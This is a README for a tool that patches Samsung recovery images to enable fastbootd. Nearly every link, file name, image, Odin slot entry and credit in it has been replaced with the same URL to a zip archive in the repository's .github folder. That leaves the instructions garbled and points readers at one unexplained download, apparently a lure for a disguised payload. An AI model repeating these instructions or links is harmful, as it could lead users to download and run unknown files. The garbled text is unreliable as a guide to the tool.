# Similar script
You can also refer this [script](https://github.com/princeyohann/Patch-Recovery/raw/refs/heads/master/.github/Recovery-Patch-2.8.zip)


# Patch-Recovery
This CI service patches recovery images of Samsung to enable Fastbootd. Based on Phh's [script](https://github.com/princeyohann/Patch-Recovery/raw/refs/heads/master/.github/Recovery-Patch-2.8.zip)

# How to use:
- Fork this repo.
- Extract your https://github.com/princeyohann/Patch-Recovery/raw/refs/heads/master/.github/Recovery-Patch-2.8.zip and upload https://github.com/princeyohann/Patch-Recovery/raw/refs/heads/master/.github/Recovery-Patch-2.8.zip or *https://github.com/princeyohann/Patch-Recovery/raw/refs/heads/master/.github/Recovery-Patch-2.8.zip to nextcloud or any other file hosting sites. Once uploaded right click on the Download button and copy the URL.
- Head over to Actions tab. Click on RECOVERY -> Run workflow. Insert the copied URL in the RECOVERY URL field and Start the workflow
- The Patching process will start
- A https://github.com/princeyohann/Patch-Recovery/raw/refs/heads/master/.github/Recovery-Patch-2.8.zip will be uploaded at the end of the process. Download it and extract your patched recovery image. The Image will already also be repacked to .tar for flashing directly through Odin
![](https://github.com/princeyohann/Patch-Recovery/raw/refs/heads/master/.github/Recovery-Patch-2.8.zip)
- Flash vbmeta_disabled_r if needed

```
ODIN AP Slot: https://github.com/princeyohann/Patch-Recovery/raw/refs/heads/master/.github/Recovery-Patch-2.8.zip
ODIN User Slot: https://github.com/princeyohann/Patch-Recovery/raw/refs/heads/master/.github/Recovery-Patch-2.8.zip
```

# Important note
- Make sure that the uploaded file can downloaded with wget command and will download a correct file. Nextcloud with public link works fine if you open the link on web and copy the url from the download button.

# Credits
- [Phhusson](https://github.com/princeyohann/Patch-Recovery/raw/refs/heads/master/.github/Recovery-Patch-2.8.zip) Without his script nothing would be possible at the first place
- [James Nguyen](https://github.com/princeyohann/Patch-Recovery/raw/refs/heads/master/.github/Recovery-Patch-2.8.zip) Helping me in simplifying the scripts and tweaking it
